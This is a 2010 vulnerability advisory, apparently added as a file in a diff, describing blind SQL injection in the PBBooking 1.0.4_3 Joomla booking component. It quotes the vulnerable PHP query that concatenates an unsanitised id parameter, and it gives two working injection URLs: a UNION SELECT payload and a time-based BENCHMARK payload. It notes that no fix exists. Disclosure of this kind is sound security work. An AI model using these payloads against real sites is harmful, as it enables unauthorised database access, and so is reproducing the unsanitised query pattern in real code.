@@ -1,0 +1,85 @@
+PBBooking 1.0.4_3 Joomla Component Multiple Blind SQL Injection
+
+ Name              PBBooking
+ Vendor            http://sourceforge.net/projects/pbbooking/
+ Versions Affected 1.0.4_3
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-07-29
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+A simple, easy to use, calendaring and booking component
+for Joomla.  PBBooking  offers live calendar integration
+both   for   reading  availability   and   for   writing
+appointments back to your calendar. 
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters  are not properly sanitised before being
+used in SQL queries.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple Blind SQL Injection
+ 
+
+A) Multiple Blind SQL Injection
+_______________________________
+
+The  parameters timeslot and id passed to controller.php
+when  the  task  option  is set respectively to save and
+validate,  are  not properly sanitised before being used
+in SQL queries.  This can be exploited to manipulate SQL
+queries by injecting arbitrary SQL code.
+
+Affected code for id parameter:
+
+function validate() {
+		
+    $pendingid = JRequest::getVar('id');
+    $email = JRequest::getVar('email');
+		
+    $sql = "select * from #__pbbooking_pending where id = ".$pendingid;
+
+
+Maybe,  the  injection caused by the id parameter may be
+carried to a normal SQL injection,  but  because of some
+errors  in  calendar.php,  currently it is not possible.
+Are them errors present only on my webserver? If no, try
+the following injection:
+
+index.php?option=com_pbbooking&task=validate&email=ola@ola.com&id=-1 UNION SELECT 1,'ola@ola.com',3,4,5,6,7,8,9
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple Blind SQL Injection
+
+http://site/path/index.php?option=com_pbbooking&task=validate&id=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(999999999,NULL),NULL)))
+
+
+V. FIX
+______
+
+No fix.
+
